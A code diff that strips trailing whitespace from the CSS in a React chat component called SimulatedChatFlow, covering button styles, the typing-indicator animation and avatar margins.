-        .bot-message-container .bot-avatar { margin-left: 0; margin-right: 8px;} 
-        .typing-indicator-container .bot-avatar { margin-left: 0; margin-right: 8px;}
-
 
         .options-container {
           margin-top: 10px;
           display: flex;
-          flex-wrap: wrap; 
-          align-items: flex-start; 
-          justify-content: flex-start; 
+          flex-wrap: wrap;
+          align-items: flex-start;
+          justify-content: flex-start;
           gap: 8px;
         }
         .chat-option-button {
-          background-color: #007bff; 
+          background-color: #007bff;
           color: white;
           border: none;
-          padding: 10px 20px; 
-          border-radius: 25px; 
+          padding: 10px 20px;
+          border-radius: 25px;
           cursor: pointer;
           font-size: 15px;
           font-weight: 500;
@@ -1096,12 +1066,10 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
         .chat-option-button:hover {
-          background-color: #0056b3; 
+          background-color: #0056b3;
         }
-        
-        
         .chat-option-button.primary_cta_button_gov_style {
-          background-color: #16a34a; 
+          background-color: #16a34a;
           border-color: #16a34a;
           color: white;
           font-weight: bold;
@@ -1113,9 +1081,9 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         .chat-option-button.secondary_link_button_gov_style {
           background-color: transparent;
           border: none;
-          color: #007bff; 
+          color: #007bff;
           text-decoration: underline;
-          padding: 4px 0; 
+          padding: 4px 0;
           box-shadow: none;
           font-size: 14px;
         }
@@ -1126,7 +1094,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
          .chat-option-button.destructive_link_button_gov_style {
           background-color: transparent;
           border: none;
-          color: #dc3545; 
+          color: #dc3545;
           text-decoration: underline;
           padding: 4px 0;
           box-shadow: none;
@@ -1139,15 +1107,15 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
 
         .typing-indicator {
-          display: inline-flex; 
+          display: inline-flex;
           align-items: center;
-          padding: 10px 15px; 
+          padding: 10px 15px;
         }
         .typing-indicator .dot {
           width: 8px;
           height: 8px;
-          margin: 0 2px; 
-          background-color: #aaa; 
+          margin: 0 2px;
+          background-color: #aaa;
           border-radius: 50%;
           animation: bounce 1.4s infinite;
         }
@@ -1158,8 +1126,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           0%, 80%, 100% { transform: scale(0); }
           40% { transform: scale(1); }
         }
-        .display-message-block .bot-message { 
-            width: auto; 
+        .display-message-block .bot-message {
+            width: auto;
             max-width: 100%;
         }
       `}</style>
@@ -1168,7 +1136,3 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 };
 
 export default SimulatedChatFlow;
-
-    
-
-    
